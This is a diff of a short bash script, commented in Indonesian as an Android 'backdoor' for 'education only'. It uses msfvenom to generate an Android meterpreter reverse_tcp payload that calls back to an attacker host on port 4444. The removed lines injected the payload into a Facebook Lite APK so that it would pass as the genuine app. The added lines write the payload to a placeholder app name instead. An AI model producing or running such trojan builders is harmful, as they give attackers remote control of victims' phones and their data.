@@ -1,7 +1,9 @@
 #!/bin/bash
+# backdoor android
+# hanya untuk edukasi, jangan disalahgunakan.
+
 payload="android/meterpreter/reverse_tcp"
-lhost="ip address"
+lhost="<_ip_address_>"
 lport="4444"
-aplikasi="facebook_lite.apk"
-hasil="Facebook Lite.apk"
-msfvenom -p "${payload}"  LHOST="${lhost}" LPORT="${lport}" -x "${aplikasi}" R > "${hasil}"
+nama_aplikasi="<_nama_aplikasi.apk_>"
+msfvenom -p "$payload"  LHOST="$lhost" LPORT="$lport" R > "$nama_aplikasi"
